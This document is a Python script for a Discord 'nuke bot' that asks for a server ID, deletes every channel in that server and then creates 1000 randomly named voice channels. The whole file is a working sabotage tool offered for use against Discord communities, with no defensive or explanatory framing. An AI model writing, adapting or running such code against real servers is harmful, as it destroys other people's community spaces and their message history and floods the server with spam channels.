import os
import discord
from discord.ext import commands
import random
import string
from colorama import Fore

os.system('clear')
print(Fore.GREEN+"""
███╗   ██╗██╗   ██╗██╗  ██╗███████╗    ██████╗  ██████╗ ████████╗
████╗  ██║██║   ██║██║ ██╔╝██╔════╝    ██╔══██╗██╔═══██╗╚══██╔══╝
██╔██╗ ██║██║   ██║█████╔╝ █████╗      ██████╔╝██║   ██║   ██║   
██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝      ██╔══██╗██║   ██║   ██║   
██║ ╚████║╚██████╔╝██║  ██╗███████╗    ██████╔╝╚██████╔╝   ██║   
╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═════╝  ╚═════╝    ╚═╝   
     
     
     
     > Service Running                                                            
""")

intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.message_content = True


bot = commands.Bot(command_prefix='!', intents=intents)


@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name} ({bot.user.id})')

    guild_id = int(input("Server ID: "))
    guild = bot.get_guild(guild_id)

    if guild:
        print(f'Connected to guild: {guild.name}')


        for channel in guild.channels:
            try:
                await channel.delete()
                print(f'Deleted channel: {channel.name}')
            except discord.Forbidden:
                print(f'Permission denied to delete channel: {channel.name}')
            except discord.HTTPException as e:
                print(f'Failed to delete channel: {channel.name}, {e}')


        for i in range(1000):
            name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
            try:
                await guild.create_voice_channel(name)
                print(f'Created voice channel: {name}')
            except discord.Forbidden:
                print(f'Permission denied to create channel: {name}')
            except discord.HTTPException as e:
                print(f'Failed to create channel: {name}, {e}')

        print('All channels have been deleted and 1000 voice channels have been created.')
    else:
        print('Guild not found.')



bot_token = input("Enter Bot Token: ")
bot.run(bot_token)
